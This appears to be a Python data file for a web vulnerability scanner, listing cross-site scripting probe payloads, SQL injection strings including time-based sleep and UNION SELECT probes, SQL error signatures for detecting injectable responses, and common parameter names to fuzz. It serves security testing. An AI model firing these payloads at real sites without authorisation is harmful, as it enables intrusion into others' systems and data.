
XSS_PAYLOADS = [
    "<script>alert('x')</script>",
    "\"'><img src=x onerror=window.__sru_dom_xss=1>",
    "'\"><svg/onload=alert(1)>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "\"><script>/*x*/console.log('x')</script>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR sleep(5)--",
    "' UNION SELECT NULL--",
    "\" OR sleep(5)--"
]

SQL_ERRORS = [
    'you have an error in your sql syntax',
    'unclosed quotation mark',
    'mysql_fetch',
    'syntax error',
    'sql error',
    'odbc',
    'pg_query'
]

COMMON_PARAM_NAMES = ["q","search","id","page","name","email","term","category","product","cat","p"]

